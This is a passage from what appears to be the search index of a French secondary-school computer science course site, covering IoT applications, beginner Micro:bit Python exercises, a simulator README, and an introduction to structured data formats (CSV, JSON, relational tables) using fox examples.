<p>\u00c9tape 3 - Traitement : - La plateforme compare avec la consigne (20\u00b0C) - Elle v\u00e9rifie les horaires de programmation - Elle consulte l'historique de consommation</p> <p>\u00c9tape 4 - Analyse : - D\u00e9cision : \"Il faut chauffer car temp\u00e9rature &lt; consigne ET pr\u00e9sence d\u00e9tect\u00e9e\" - Calcul de la puissance optimale selon l'isolation</p> <p>\u00c9tape 5 - Action : - Commande envoy\u00e9e \u00e0 l'actionneur (\u00e9lectrovanne) - D\u00e9marrage du chauffage - Notification envoy\u00e9e sur l'application mobile</p> <p>Warning</p> <p>Ce cycle se r\u00e9p\u00e8te en permanence, g\u00e9n\u00e9ralement toutes les quelques minutes, pour maintenir un contr\u00f4le pr\u00e9cis.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#applications-des-objets-connectes","title":"Applications des objets connect\u00e9s","text":"<p>Les objets connect\u00e9s transforment de nombreux secteurs de notre soci\u00e9t\u00e9 :</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#domotique","title":"Domotique","text":"<ul> <li>\u00c9clairage intelligent : ampoules qui s'adaptent \u00e0 la luminosit\u00e9 ext\u00e9rieure</li> <li>S\u00e9curit\u00e9 : cam\u00e9ras, d\u00e9tecteurs de mouvement, serrures connect\u00e9es</li> <li>Confort : thermostats, volets automatiques, enceintes connect\u00e9es</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#sante","title":"Sant\u00e9","text":"<ul> <li>Montres connect\u00e9es : surveillance du rythme cardiaque, compteur de pas</li> <li>Dispositifs m\u00e9dicaux : tensiom\u00e8tres, glucom\u00e8tres connect\u00e9s</li> <li>T\u00e9l\u00e9m\u00e9decine : consultation \u00e0 distance, suivi de patients</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#agriculture","title":"Agriculture","text":"<ul> <li>Capteurs de sol : mesure de l'humidit\u00e9, de la temp\u00e9rature, du pH</li> <li>Irrigation automatique : arrosage optimis\u00e9 selon les besoins</li> <li>Surveillance du b\u00e9tail : colliers connect\u00e9s pour localiser les animaux</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#industrie","title":"Industrie","text":"<ul> <li>Maintenance pr\u00e9dictive : capteurs sur les machines pour anticiper les pannes</li> <li>Optimisation \u00e9nerg\u00e9tique : suivi de la consommation en temps r\u00e9el</li> <li>Tra\u00e7abilit\u00e9 : suivi des produits tout au long de la cha\u00eene de production</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#villes-intelligentes","title":"Villes intelligentes","text":"<ul> <li>\u00c9clairage public : adaptation automatique selon la fr\u00e9quentation</li> <li>Gestion des d\u00e9chets : capteurs de remplissage des poubelles</li> <li>Transport : optimisation du trafic, v\u00e9hicules autonomes</li> </ul> <p>L'avenir des objets connect\u00e9s s'oriente vers une int\u00e9gration toujours plus pouss\u00e9e dans notre quotidien, avec des objets plus intelligents, plus autonomes et plus respectueux de l'environnement.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/activite/","title":"Activit\u00e9 micro-controlleurs","text":"<p>Activit\u00e9 micro-controlleurs</p>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/","title":"Travail Pratique : Cartes Micro:bit","text":""},{"location":"seconde/VIII_-_Objets_Connectes/tp/#definitions","title":"D\u00e9finitions","text":"<p>Les cartes Micro:bit sont des cartes \u00e9lectroniques qui sont une introduction \u00e0 l'informatique embarqu\u00e9e et \u00e0 la r\u00e9alisation d'affichages, sons etc... \u00e0 l'aide de boutons et de leds.</p> <p>Une carte Micro:bit est consitu\u00e9e de plusieurs \u00e9l\u00e9ments :</p> Pr\u00e9sentation de la carte Carte avec une t\u00eate renard minimaliste en pixel art"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#documentation-des-fonctionnalites","title":"Documentation des fonctionnalit\u00e9s","text":"Fonctionnalit\u00e9 Explication Exemple Affichage LED Affiche des motifs sur la grille de LED 5x5 <code>display.show(Image.HEART)</code> Messages d\u00e9filants Fait d\u00e9filer du texte sur l'\u00e9cran LED <code>display.scroll(\"Bonjour\")</code> Boutons Deux boutons (A et B) pour l'interaction <code>button_a.is_pressed()</code> Pause Met en pause le programme <code>sleep(1000)</code> # pause 1 seconde Images pr\u00e9d\u00e9finies Motifs LED pr\u00e9enregistr\u00e9s <code>Image.HAPPY</code>, <code>Image.SAD</code>, <code>Image.HEART</code> Boucle infinie R\u00e9p\u00e8te le code en continu <code>while True:</code>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#pour-commencer","title":"Pour commencer","text":"<p>Pour programmer la carte, on utilise le site Site de Micro:Bit.</p> <p></p> <p>Le bloc orange correspond \u00e0 la biblioth\u00e8que des blocs pouvant \u00eatre utilis\u00e9s. Le bloc marron est l'\u00e9diteur de code. Le bloc vert permet d'envoyer le programme \u00e0 la carte.</p> <p>Voici un exemple simple pour commencer :</p> <pre><code># Importer les paquets necessaires\nfrom microbit import *\n\n# Boucle infinie\nwhile True:\n    # Affiche un coeur\n    display.show(Image.HEART)\n    # Attend 1 seconde\n    sleep(1000)\n    # Affiche un message\n    display.scroll('Hello')\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercices","title":"Exercices","text":""},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-1-affichage-simple","title":"\ud83c\udf1f Exercice 1 : Affichage simple","text":"<p>Difficult\u00e9 : \u2b50</p> <p>Affichez le motif d'un visage souriant (<code>Image.HAPPY</code>) sur l'\u00e9cran LED.</p> <p>\ud83d\udca1 Indice : Utilisez <code>display.show()</code> avec <code>Image.HAPPY</code></p>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-2-message-defilant","title":"\ud83c\udfa8 Exercice 2 : Message d\u00e9filant","text":"<p>Difficult\u00e9 : \u2b50</p> <p>Faites d\u00e9filer votre pr\u00e9nom sur l'\u00e9cran LED.</p> <p>\ud83d\udca1 Indice : Utilisez <code>display.scroll(\"votre_prenom\")</code></p>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-3-premier-bouton","title":"\ud83c\udfae Exercice 3 : Premier bouton","text":"<p>Difficult\u00e9 : \u2b50\u2b50</p> <p>Affichez un c\u0153ur quand on appuie sur le bouton A.</p> <pre><code># Structure de base\nfrom microbit import *\n\nwhile True:\n    if button_a.is_pressed():\n        # Votre code ici\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-4-alternance-simple","title":"\ud83c\udfa8 Exercice 4 : Alternance simple","text":"<p>Difficult\u00e9 : \u2b50\u2b50</p> <p>Alternez entre deux images toutes les secondes (par exemple un c\u0153ur et un carr\u00e9).</p> <p>\ud83d\udca1 Indice :  - Utilisez <code>Image.HEART</code> et <code>Image.SQUARE</code> - N'oubliez pas <code>sleep(1000)</code> entre les images</p>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-5-tete-de-renard","title":"\ud83e\udd8a Exercice 5 : T\u00eate de Renard","text":"<p>Difficult\u00e9 : \u2b50\u2b50\u2b50</p> <p>Recr\u00e9ez la t\u00eate de renard montr\u00e9e dans l'introduction en utilisant le syst\u00e8me de pixel art de la Micro:bit.</p> <p>\ud83d\udca1 Indice :</p> <ul> <li>Regardez attentivement l'image du renard dans l'introduction</li> <li>Utilisez diff\u00e9rents niveaux de luminosit\u00e9 (0-9) pour cr\u00e9er les d\u00e9tails</li> <li>Commencez par dessiner votre motif sur papier en grille 5x5</li> </ul> <pre><code># Structure de base pour la t\u00eate de renard\ndisplay.show(Image(\"00000:\"  # Ligne 1\n                \"00000:\"  # Ligne 2\n                \"00000:\"  # Ligne 3\n                \"00000:\"  # Ligne 4\n                \"00000\"))  # Ligne 5\n# Remplacez les 0 par les bonnes valeurs de luminosit\u00e9\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-6-message-au-bouton","title":"\ud83c\udf1f Exercice 6 : Message au bouton","text":"<p>Difficult\u00e9 : \u2b50\u2b50</p> <p>Affichez \"A\" quand on appuie sur le bouton A, et \"B\" quand on appuie sur le bouton B.</p> <p>\ud83d\udca1 Indice :  - Utilisez <code>button_a.is_pressed()</code> et <code>button_b.is_pressed()</code> - Utilisez <code>display.scroll()</code></p>"},{"location":"seconde/VIII_-_Objets_Connectes/tp/#exercice-bonus-images-personnalisees","title":"Exercice Bonus : Images personnalis\u00e9es","text":"<p>Difficult\u00e9 : \u2b50\u2b50\u2b50</p> <p>Cr\u00e9ez et affichez votre propre motif sur l'\u00e9cran LED.</p> <pre><code># Exemple de cr\u00e9ation d'image\nmon_image = Image(\"09090:\" # Ligne 1\n                 \"00000:\" # Ligne 2\n                 \"90009:\" # Ligne 3\n                 \"09990:\" # Ligne 4\n                 \"00000\") # Ligne 5\n# Les chiffres repr\u00e9sentent la luminosit\u00e9 (0-9)\n</code></pre> <p>\ud83d\udca1 Indice :  - Dessinez d'abord votre motif sur papier - Utilisez des chiffres de 0 (\u00e9teint) \u00e0 9 (luminosit\u00e9 maximale)</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/","title":"\ud83c\udfae Simulateur BBC Micro:bit V2","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#description","title":"\ud83d\udccb Description","text":"<p>Cette application Python simule le fonctionnement d'une carte BBC Micro:bit V2 avec un mini IDE int\u00e9gr\u00e9. Elle permet aux \u00e9l\u00e8ves d'apprendre la programmation d'objets connect\u00e9s de mani\u00e8re interactive et visuelle.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#installation-et-lancement","title":"\ud83d\ude80 Installation et lancement","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#prerequis","title":"Pr\u00e9requis","text":"<ul> <li>Python 3.6 ou plus r\u00e9cent</li> <li>Tkinter (g\u00e9n\u00e9ralement inclus avec Python)</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#lancement","title":"Lancement","text":"<pre><code>python microbit_simulator.py\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#fonctionnalites","title":"\ud83c\udfaf Fonctionnalit\u00e9s","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#simulation-de-la-microbit","title":"Simulation de la Micro:bit","text":"<ul> <li>Matrice LED 5x5 : Affichage visuel des LEDs</li> <li>Boutons A et B : Cliquables avec la souris</li> <li>Capteurs simul\u00e9s :</li> <li>Acc\u00e9l\u00e9rom\u00e8tre (valeurs al\u00e9atoires)</li> <li>Capteur de temp\u00e9rature</li> <li>Capteur de luminosit\u00e9</li> <li>Affichage en temps r\u00e9el des valeurs des capteurs</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#mini-ide","title":"Mini IDE","text":"<ul> <li>Onglet Blocs de code : Interface par blocs pour faciliter l'apprentissage</li> <li>Onglet Code Python : \u00c9diteur de texte pour le code Python</li> <li>Exemples int\u00e9gr\u00e9s : Code d'exemple pour commencer</li> <li>Ex\u00e9cution en temps r\u00e9el : Voir les r\u00e9sultats imm\u00e9diatement</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#utilisation-pedagogique","title":"\ud83d\udcda Utilisation p\u00e9dagogique","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#pour-les-eleves","title":"Pour les \u00e9l\u00e8ves","text":"<ol> <li>Commencer avec les blocs :</li> <li>Utilisez l'onglet \"Blocs de code\"</li> <li>Cliquez sur les boutons pour ajouter du code</li> <li> <p>Cat\u00e9gories disponibles : Affichage, Boutons, Capteurs, Contr\u00f4le, Images</p> </li> <li> <p>Passer au code Python :</p> </li> <li>Basculez vers l'onglet \"Code Python\"</li> <li>Modifiez le code g\u00e9n\u00e9r\u00e9</li> <li> <p>Ajoutez vos propres fonctionnalit\u00e9s</p> </li> <li> <p>Tester votre code :</p> </li> <li>Cliquez sur \"\u25b6 Ex\u00e9cuter\" pour lancer votre programme</li> <li>Interagissez avec les boutons A et B</li> <li>Observez les LEDs s'allumer</li> <li>Utilisez \"\u23f9 Arr\u00eater\" pour stopper l'ex\u00e9cution</li> <li>\"\ud83d\udd04 Reset\" pour remettre \u00e0 z\u00e9ro</li> </ol>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#exemples-dactivites","title":"Exemples d'activit\u00e9s","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#1-premier-programme-cur-clignotant","title":"1. Premier programme - C\u0153ur clignotant","text":"<pre><code>from microbit import *\n\nwhile True:\n    display.show(Image.HEART)\n    sleep(500)\n    display.clear()\n    sleep(500)\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#2-compteur-avec-boutons","title":"2. Compteur avec boutons","text":"<pre><code>from microbit import *\n\ncompteur = 0\n\nwhile True:\n    if button_a.was_pressed():\n        compteur += 1\n        display.scroll(str(compteur))\n    if button_b.was_pressed():\n        compteur -= 1\n        display.scroll(str(compteur))\n    sleep(100)\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#3-thermometre","title":"3. Thermom\u00e8tre","text":"<pre><code>from microbit import *\n\nwhile True:\n    temp = temperature()\n    display.scroll(str(temp) + 'C')\n    sleep(2000)\n</code></pre>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#interface-utilisateur","title":"\ud83c\udfa8 Interface utilisateur","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#zone-de-simulation-gauche","title":"Zone de simulation (gauche)","text":"<ul> <li>Repr\u00e9sentation visuelle de la Micro:bit</li> <li>Matrice LED interactive</li> <li>Boutons A et B cliquables</li> <li>Panneau d'informations des capteurs</li> <li>Boutons de contr\u00f4le (Ex\u00e9cuter, Arr\u00eater, Reset)</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#mini-ide-droite","title":"Mini IDE (droite)","text":"<ul> <li>Onglet Blocs : Cat\u00e9gories de blocs de code pr\u00eats \u00e0 utiliser</li> <li>Onglet Code : \u00c9diteur de texte avec exemples</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#api-simulee","title":"\ud83d\udd27 API Simul\u00e9e","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#affichage","title":"Affichage","text":"<ul> <li><code>display.show(Image.HEART)</code> : Afficher une image</li> <li><code>display.scroll('Hello')</code> : Faire d\u00e9filer du texte</li> <li><code>display.set_pixel(x, y, brightness)</code> : Allumer/\u00e9teindre une LED</li> <li><code>display.clear()</code> : \u00c9teindre toutes les LEDs</li> <li><code>display.read_light_level()</code> : Lire le niveau de luminosit\u00e9</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#boutons","title":"Boutons","text":"<ul> <li><code>button_a.is_pressed()</code> : V\u00e9rifier si le bouton A est press\u00e9</li> <li><code>button_b.is_pressed()</code> : V\u00e9rifier si le bouton B est press\u00e9</li> <li><code>button_a.was_pressed()</code> : V\u00e9rifier si le bouton A a \u00e9t\u00e9 press\u00e9</li> <li><code>button_a.wait_for_press()</code> : Attendre que le bouton A soit press\u00e9</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#capteurs","title":"Capteurs","text":"<ul> <li><code>temperature()</code> : Lire la temp\u00e9rature</li> <li><code>accelerometer.get_x()</code> : Lire l'acc\u00e9l\u00e9ration X</li> <li><code>accelerometer.get_y()</code> : Lire l'acc\u00e9l\u00e9ration Y</li> <li><code>accelerometer.get_z()</code> : Lire l'acc\u00e9l\u00e9ration Z</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#images-predefinies","title":"Images pr\u00e9d\u00e9finies","text":"<ul> <li><code>Image.HEART</code> : C\u0153ur</li> <li><code>Image.HAPPY</code> : Visage heureux</li> <li><code>Image.SAD</code> : Visage triste</li> <li><code>Image.ARROW_N</code> : Fl\u00e8che vers le haut</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#controle","title":"Contr\u00f4le","text":"<ul> <li><code>sleep(ms)</code> : Pause en millisecondes</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#objectifs-pedagogiques","title":"\ud83c\udf93 Objectifs p\u00e9dagogiques","text":"<ul> <li>D\u00e9couverte de la programmation : Interface intuitive avec blocs de code</li> <li>Transition vers Python : Passage progressif des blocs au code textuel</li> <li>Compr\u00e9hension des objets connect\u00e9s : Capteurs, actionneurs, programmation</li> <li>Logique algorithmique : Boucles, conditions, variables</li> <li>Interaction homme-machine : Boutons, affichage, capteurs</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#conseils-dutilisation","title":"\ud83d\udd0d Conseils d'utilisation","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#pour-les-enseignants","title":"Pour les enseignants","text":"<ul> <li>Commencez par des exemples simples (c\u0153ur clignotant)</li> <li>Encouragez l'exp\u00e9rimentation avec les blocs</li> <li>Progressez vers la modification du code Python</li> <li>Utilisez les capteurs pour des projets plus avanc\u00e9s</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#pour-les-eleves_1","title":"Pour les \u00e9l\u00e8ves","text":"<ul> <li>N'h\u00e9sitez pas \u00e0 exp\u00e9rimenter</li> <li>Utilisez les exemples comme base</li> <li>Combinez diff\u00e9rents blocs pour cr\u00e9er vos programmes</li> <li>Testez r\u00e9guli\u00e8rement votre code</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#depannage","title":"\ud83d\udc1b D\u00e9pannage","text":""},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#problemes-courants","title":"Probl\u00e8mes courants","text":"<ul> <li>Le programme ne s'arr\u00eate pas : Utilisez le bouton \"\u23f9 Arr\u00eater\"</li> <li>Erreur de syntaxe : V\u00e9rifiez l'indentation et la syntaxe Python</li> <li>LEDs qui ne s'allument pas : V\u00e9rifiez les coordonn\u00e9es (0-4 pour x et y)</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#messages-derreur","title":"Messages d'erreur","text":"<ul> <li>Les erreurs Python sont affich\u00e9es dans une bo\u00eete de dialogue</li> <li>Lisez attentivement le message pour identifier le probl\u00e8me</li> </ul>"},{"location":"seconde/VIII_-_Objets_Connectes/Application_Microbit/#licence","title":"\ud83d\udcdd Licence","text":"<p>Cette application est destin\u00e9e \u00e0 un usage \u00e9ducatif. Elle simule le comportement d'une BBC Micro:bit \u00e0 des fins p\u00e9dagogiques.</p> <p>Bon apprentissage ! \ud83c\udf89</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Activit%C3%A9%20blockly/","title":"Activit\u00e9 Blocly Donn\u00e9es Structur\u00e9es","text":"<p>Activit\u00e9 Blocly Donn\u00e9es Structur\u00e9es</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/","title":"\ud83d\udcca Donn\u00e9es Structur\u00e9es","text":"<p>La n\u00e9cessit\u00e9 d'organiser et de structurer les donn\u00e9es remonte aux premiers syst\u00e8mes informatiques des ann\u00e9es 1960. \u00c0 l'\u00e9poque, les chercheurs avaient besoin de stocker et de traiter de grandes quantit\u00e9s d'informations de mani\u00e8re efficace, notamment pour les bases de donn\u00e9es scientifiques et les syst\u00e8mes de gestion.</p> <p>Le premier objectif \u00e9tait de cr\u00e9er des formats standardis\u00e9s pour que les machines puissent comprendre et traiter l'information automatiquement.</p> <p>C'est dans les ann\u00e9es 1970 qu'Edgar F. Codd, un informaticien d'IBM, a r\u00e9volutionn\u00e9 le domaine en proposant le mod\u00e8le relationnel pour les bases de donn\u00e9es. Ce mod\u00e8le est devenu la base de la plupart des syst\u00e8mes de gestion de bases de donn\u00e9es modernes.</p> <p>Les premi\u00e8res bases de donn\u00e9es relationnelles ont vu le jour dans les ann\u00e9es 1980.</p> <p></p> <p>\u00c0 la suite de cela, dans les ann\u00e9es 1990-2000, de nouveaux formats d'\u00e9change de donn\u00e9es ont \u00e9merg\u00e9 avec l'essor d'Internet. On appelle ces formats des standards d'\u00e9change car ils permettent \u00e0 diff\u00e9rents syst\u00e8mes de communiquer.</p> <p>La mani\u00e8re de structurer les donn\u00e9es est organis\u00e9e selon diff\u00e9rents niveaux de complexit\u00e9. Ces niveaux correspondent \u00e0 diff\u00e9rents besoins : du simple tableau (CSV) aux structures complexes (JSON, XML). Dans les ann\u00e9es 2000, le format JSON a r\u00e9volutionn\u00e9 l'\u00e9change de donn\u00e9es sur le web. Il a \u00e9t\u00e9 adopt\u00e9 massivement \u00e0 partir de 2005 pour sa simplicit\u00e9 et sa lisibilit\u00e9. Les ann\u00e9es 2010 ont vu l'explosion du Big Data et des nouvelles approches de stockage de donn\u00e9es.</p> <p>Depuis, les donn\u00e9es structur\u00e9es permettent de g\u00e9rer des milliards d'informations pour alimenter des applications, des sites web ou des syst\u00e8mes d'intelligence artificielle. Par exemple, il existe des formats pour les donn\u00e9es tabulaires (CSV), les donn\u00e9es hi\u00e9rarchiques (JSON) ou les documents structur\u00e9s (XML).</p> <p></p> <p>En clair, les donn\u00e9es structur\u00e9es sont des informations organis\u00e9es selon des r\u00e8gles pr\u00e9cises qui permettent leur traitement automatique par les machines.</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/#definitions","title":"D\u00e9finitions","text":"<p>Une donn\u00e9e structur\u00e9e est une information organis\u00e9e selon un format pr\u00e9d\u00e9fini qui facilite son stockage, sa recherche et son traitement automatique par les machines. On retrouve diff\u00e9rents types de structures de donn\u00e9es qui ont chacune leur propre usage.</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/#les-formats-de-donnees-structurees","title":"Les formats de donn\u00e9es structur\u00e9es","text":"<p>Pour qu'un syst\u00e8me de donn\u00e9es fonctionne, il faut des formats standardis\u00e9s pour organiser l'information.</p> <p>On retrouve :</p> Format R\u00f4le Exemple d'usage CSV Format tabulaire simple pour donn\u00e9es en lignes/colonnes Tableurs, exports de bases de donn\u00e9es JSON Format hi\u00e9rarchique pour structures complexes APIs web, configuration d'applications XML Format de balisage pour documents structur\u00e9s Documents officiels, \u00e9change entre syst\u00e8mes SQL Langage pour interroger les bases de donn\u00e9es relationnelles Requ\u00eates de bases de donn\u00e9es, rapports <p>On a d\u00e9fini dans les r\u00f4les diff\u00e9rents types de structures. On peut les regrouper en 2 cat\u00e9gories :</p> <ul> <li>Donn\u00e9es tabulaires : donn\u00e9es organis\u00e9es en lignes et colonnes (comme un tableau).</li> <li>Donn\u00e9es hi\u00e9rarchiques : donn\u00e9es organis\u00e9es en arbre avec des niveaux de profondeur.</li> </ul> <p></p> <p>Danger</p> <p>On dispose de formats, de structures mais, comment les machines comprennent-elles ces donn\u00e9es? Quelles r\u00e8gles sont utilis\u00e9es?</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/#le-format-csv-pour-les-donnees-tabulaires","title":"Le format CSV pour les donn\u00e9es tabulaires","text":"<p>Une donn\u00e9e tabulaire dispose d'une structure en lignes et colonnes. Cette structure permet d'organiser l'information de mani\u00e8re simple et lisible.</p> <p>Le format CSV utilise des s\u00e9parateurs (g\u00e9n\u00e9ralement des virgules) pour d\u00e9limiter les colonnes. Cette organisation peut aussi \u00eatre appel\u00e9e format d\u00e9limit\u00e9 car elle utilise des caract\u00e8res sp\u00e9ciaux pour s\u00e9parer les donn\u00e9es. Ce format est compos\u00e9 d'une ligne d'en-t\u00eate suivie des donn\u00e9es. </p> <p>Exemple : <code>Nom,Espece,Habitat,Poids</code>.</p> <p>Exemple : Base de donn\u00e9es sur les renards</p> <pre><code>Nom,Espece,Habitat,Poids_kg,Longueur_cm\nRusty,Vulpes vulpes,For\u00eat temp\u00e9r\u00e9e,6.5,58\nArctic,Vulpes lagopus,Toundra arctique,3.2,46\nFennec,Vulpes zerda,D\u00e9sert,1.5,24\nSilver,Vulpes vulpes,For\u00eat bor\u00e9ale,7.1,61\n</code></pre>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/#le-format-json-pour-les-donnees-hierarchiques","title":"Le format JSON pour les donn\u00e9es hi\u00e9rarchiques","text":"<p>Chaque donn\u00e9e complexe doit pouvoir \u00eatre repr\u00e9sent\u00e9e avec ses relations internes. Sur le web, on utilise ce que l'on appelle le format JSON (pour JavaScript Object Notation). Un objet JSON est constitu\u00e9 de paires cl\u00e9-valeur organis\u00e9es de mani\u00e8re hi\u00e9rarchique. Le JSON correspond \u00e0 une repr\u00e9sentation textuelle lisible par l'humain mais aussi par l'ordinateur. Par exemple : {\"nom\": \"Rusty\", \"poids\": 6.5} est un objet JSON simple. Il faut pouvoir repr\u00e9senter ces donn\u00e9es de mani\u00e8re structur\u00e9e et imbriqu\u00e9e. L'objet JSON est constitu\u00e9 de plusieurs types de donn\u00e9es :  </p> <p>Les types simples : ils permettent de stocker une valeur unique. Les types complexes : ils permettent de stocker plusieurs valeurs ou d'autres objets.</p> <p>Pour organiser ces donn\u00e9es, on utilise ce que l'on appelle une hi\u00e9rarchie. Elle permet de d\u00e9finir des niveaux de profondeur dans les donn\u00e9es. On peut repr\u00e9senter cette hi\u00e9rarchie de diverses mani\u00e8res.</p> <p>Exemple :</p> <p>On dispose de l'objet renard qui contient des caract\u00e9ristiques et un habitat.</p> <p>Cela correspond \u00e0 une structure o\u00f9 l'objet principal contient d'autres objets. Ce qui veut dire que l'objet renard est le parent et les caract\u00e9ristiques sont les enfants.  </p> <p>On peut donc d\u00e9finir que l'objet renard contient les propri\u00e9t\u00e9s nom, esp\u00e8ce et des sous-objets caract\u00e9ristiques et habitat.</p> <p>Warning</p> <p>La structure hi\u00e9rarchique est tr\u00e8s importante car elle permet de repr\u00e9senter des relations complexes entre les donn\u00e9es.</p> <p>Exemple : Fiche d\u00e9taill\u00e9e d'un renard</p> <pre><code>{\n  \"renard\": {\n    \"nom\": \"Rusty\",\n    \"espece\": \"Vulpes vulpes\",\n    \"caracteristiques\": {\n      \"poids\": 6.5,\n      \"longueur\": 58,\n      \"couleur\": \"roux\",\n      \"age\": 3\n    },\n    \"habitat\": {\n      \"type\": \"For\u00eat temp\u00e9r\u00e9e\",\n      \"region\": \"Europe\",\n      \"coordonnees\": {\n        \"latitude\": 48.8566,\n        \"longitude\": 2.3522\n      }\n    },\n    \"alimentation\": [\"rongeurs\", \"oiseaux\", \"insectes\", \"fruits\"]\n  }\n}\n</code></pre> <p>On sait comment les donn\u00e9es sont organis\u00e9es dans les formats simples (CSV, JSON) mais on veut savoir surtout comment stocker et interroger de grandes quantit\u00e9s de donn\u00e9es de mani\u00e8re efficace. Pour g\u00e9rer des volumes importants, on ne peut pas se contenter de fichiers simples. En effet, les donn\u00e9es sont trop nombreuses pour \u00eatre trait\u00e9es d'un coup, il faut les organiser. On appelle base de donn\u00e9es un syst\u00e8me organis\u00e9 pour stocker, g\u00e9rer et interroger de grandes quantit\u00e9s d'informations.</p> <p>Le mod\u00e8le relationnel permet la gestion et l'interrogation de donn\u00e9es structur\u00e9es entre plusieurs tables li\u00e9es entre elles. Ce mod\u00e8le est compos\u00e9 de plusieurs concepts :</p> <ul> <li> <p>Le concept de table permet l'organisation des donn\u00e9es en lignes et colonnes.    Il permet d'\u00eatre s\u00fbr qu'une donn\u00e9e est stock\u00e9e de mani\u00e8re coh\u00e9rente \u00e0 l'aide de contraintes.</p> </li> <li> <p>Le concept de relation qui permet de lier les tables entre elles \u00e0 l'aide de cl\u00e9s.</p> </li> </ul> <p>Le mod\u00e8le relationnel fonctionne en plusieurs \u00e9tapes :</p> <ol> <li>Les donn\u00e9es sont organis\u00e9es en tables avec des colonnes typ\u00e9es et des lignes d'enregistrements.</li> <li>Les tables sont li\u00e9es entre elles par des relations (cl\u00e9s \u00e9trang\u00e8res).</li> <li>Les donn\u00e9es sont interrog\u00e9es \u00e0 l'aide du langage SQL.</li> <li>Enfin, un contr\u00f4le est r\u00e9alis\u00e9 par le syst\u00e8me pour s'assurer que les donn\u00e9es respectent les contraintes, c'est \u00e0 dire que les donn\u00e9es sont coh\u00e9rentes.   Si les donn\u00e9es ne respectent pas les contraintes, le syst\u00e8me refuse l'op\u00e9ration.</li> </ol>"},{"location":"seconde/VII_-_Donnees_Structurees/Cours/#concept-de-table","title":"Concept de table","text":"<p>Une table est une structure de donn\u00e9es organis\u00e9e en lignes (enregistrements) et colonnes (champs).</p> <p>Exemple : Table \"Renards\"</p> ID Nom Esp\u00e8ce Habitat Poids (kg) R\u00e9gion 1 Rusty Vulpes vulpes For\u00eat 6.5 Europe 2 Arctic Vulpes lagopus Toundra 3.2 Arctique 3 Fennec Vulpes zerda D\u00e9sert 1.5 Afrique 4 Silver Vulpes vulpes For\u00eat 7.1 Am\u00e9rique"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/","title":"\ud83d\udcca Fiche d'exercices - Donn\u00e9es Structur\u00e9es","text":""},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#exercice-1-decouverte-des-formats-de-donnees","title":"Exercice 1 : D\u00e9couverte des formats de donn\u00e9es","text":"<p>Objectif : Identifier les diff\u00e9rents formats de donn\u00e9es structur\u00e9es</p>"},{"location":"seconde/VII_-_Donnees_Structurees/Fiche_exercices/#question-11","title":"Question 1.1","text":"<p>Associez chaque format \u00e0 sa description :</p> Format Description A. CSV 1. Format hi\u00e9rarchique utilisant des paires cl\u00e9-valeur B. JSON 2. Format tabulaire avec s\u00e9parateurs C. XML 3. Format de balisage pour documents structur\u00e9s D. SQL 4. Langage pour interroger les bases de 